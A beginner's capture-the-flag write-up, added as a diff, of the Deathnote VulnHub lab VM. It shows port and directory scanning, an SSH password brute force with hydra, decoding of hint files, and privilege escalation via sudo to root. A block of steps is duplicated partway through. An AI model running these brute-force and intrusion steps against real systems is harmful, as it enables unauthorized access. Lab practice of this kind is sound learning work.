@@ -1,0 +1,191 @@
+Deathnote VulnHub CTF
+
+Netdiscover new VM to get IP address - 10.0.2.11 for me
+then use sudo nmap -sCV 10.0.2.11 to get ports open
+ports 22 and 80 are open.... time to go onto firefox and type in http://10.0.2.11, which resolves to deathnote.vuln/wordpress
+
+the site hints there is a notes.txt file on server.
+
+so i decided to run a gobuster  on http://10.0.2.11 gobuster dir -u http://10.0.2.11 -w /usr/share/wordlists/dirb/common.txt
+results show a robots.txt file, so i checked it out and got a message saying
+ fuck it my dad
+added hint on /important.jpg
+ryuk please delete it
+
+decided to check it out by using curl http://deathnote.vuln/important.jpg and get this message:
+i am Soichiro Yagami, light's father
+i have a doubt if L is true about the assumption that light is kira
+
+i can only help you by giving something important
+
+login username : user.txt
+i don't know the password.
+find it by yourself
+but i think it is in the hint section of site
+
+
+so we know there is a user.txt and a notes.txt somewhere, so i decided to try and use Nikto this time
+nikto -h deathnote.vuln
+
+NIkto reveals a content/uploads folder, sounds like a juicy spot to check so i added the wordpress/wp-content/uploads/ and found the jackpot!
+UNDer 2021 > 07/ theres a few files, namely our notes and user txt files
+Notes.txt looks like passwords
+User.txt looks like usernames
+
+Maybe use something like HYdra again to bruteforce our way in, BUT first we need to download the notes and user txt files using wget to create our wordlis>
+wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
+wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
+
+got the files! NOW to use HYdra to create wordlists and bruteforce the combination
+
+hydra -L user.txt -P notes.txt deathnote.vuln ssh
+
+this part took a bit, so bio break and hydrate...
+
+GOT IT!
+STATUS] 280.00 tries/min, 280 tries in 00:01h, 453 to do in 00:02h, 14 active
+[22][ssh] host: deathnote.vuln   login: l   password: death4me
+
+now to ssh into the machine using ssh l@10.0.2.11 password is death4me
+first thing i did was ls to see files and got a user.txt
+
+Cat,head and tails all show what looks like gibberish when viewing the file
+
+user.txt
+l@deathnote:~$ cat user.txt
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.->
+
+
+wtf??? had to google it, this is what i got:
+The text you provided is encoded in Brainfuck, an esoteric programming language designed to be deliberately difficult for humans to read.
+When executed through a Brainfuck interpreter, the string outputs the following hidden message:
+i think u got the shell , but you wont be able to kill me -kira
+
+what? lol
+
+after some blood, sweat and tears, i found the next step, NAvigate to cd /opt > L to see two directories:
+
+fake-notebook-rule - cd into this and you see a .wav file and a hint file, the hint says use cyberchef
+
+kira_case - inside is a case file which says this:
+the FBI agent died on December 27, 2006
+1 week after the investigation of the task-force member/head.
+aka.....
+Soichiro Yagami's family .
+hmmmmmmmmm......
+
+and according to watari ,
+he died as other died after Kira targeted them .
+and we also found something in
+fake-notebook-rule folder .
+
+
+case.wav gives us this:
+l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
+63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
+which we know from the hint to use cyberchef
+that gives me this : passwd:kiraisevil
+
+well the story goes deep i guess.....
+anyway i went back to the home directory and hit ls, i see there is two users. Kira and L, we are already in L, so lets try kira.
+
+l@deathnote:/$ cd /home
+l@deathnote:/home$ ls
+kira  l
+l@deathnote:/home$ cd kira
+l@deathnote:/home/kira$ ls
+kira.txt
+l@deathnote:/home/kira$ kira.txt
+-bash: kira.txt: command not found
+l@deathnote:/home/kira$ cat kira.txt
+cat: kira.txt: Permission denied
+
+well then permission denied.... lets try to su in as kira now
+
+kira@deathnote:~$ cat kira.txt
+cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
+kira@deathnote:~$
+
+not this agin... time for cyberchef again i guess
+
+not going to lie had to google it, cyberchef wasnt giving me anything
+echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp" | base64 — decode
+
+gives you this:
+kira@deathnote:~$ echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp"|base64  --decode
+please protect one of the following
+1. L (/opt)
+2. Misa (/var)kira@deathnote:
+
+we did /opt already so we selected the /var by using cd /var
+kira@deathnote:~$ cd /var
+kira@deathnote:/var$ ls
+backups  cache  lib  local  lock  log  mail  misa  opt  run  spool  tmp  www
+kira@deathnote:/var$ cat misa
+it is toooo late for misa
+kira@deathnote:/var$ sudo -l
+[sudo] password for kira:
+Sorry, try again.
+[sudo] password for kira:
+Matching Defaults entries for kira on deathnote:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User kira may run the following commands on deathnote:
+    (ALL : ALL) ALL
+
+looks like kira is root and has all permissions
+
+time to elevate permissions to root
+kira@deathnote:/var$ sudo su
+
+oot@deathnote:/var# cd
+root@deathnote:~#
+
+root@deathnote:~# ls
+root.txt
+root@deathnote:~# cat root.txt
+
+not going to lie had to google it, cyberchef wasnt giving me anything
+echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp" | base64 — decode
+
+gives you this:
+kira@deathnote:~$ echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp"|base64  --decode
+please protect one of the following
+1. L (/opt)
+2. Misa (/var)kira@deathnote:
+
+we did /opt already so we selected the /var by using cd /var
+kira@deathnote:~$ cd /var
+kira@deathnote:/var$ ls
+backups  cache  lib  local  lock  log  mail  misa  opt  run  spool  tmp  www
+kira@deathnote:/var$ cat misa
+it is toooo late for misa
+kira@deathnote:/var$ sudo -l
+[sudo] password for kira:
+Sorry, try again.
+[sudo] password for kira:
+Matching Defaults entries for kira on deathnote:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+kira@deathnote:/var$ sudo su
+root@deathnote:/var# cd
+root@deathnote:~# ls
+root.txt
+root@deathnote:~# cat root.txt
+
+
+      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       ::::::::
+    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+:
+   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+
+  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++
+ +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+
+#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     
+########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       
+
+##########follow me on twitter###########3
+and share this screen shot and tag @KDSAMF
+
+
+we did it! after a few google searches on syntax, this is my second ctf type activity.
+still working on syntax and learning tools, but this is fun and builds up knowledge
+
+
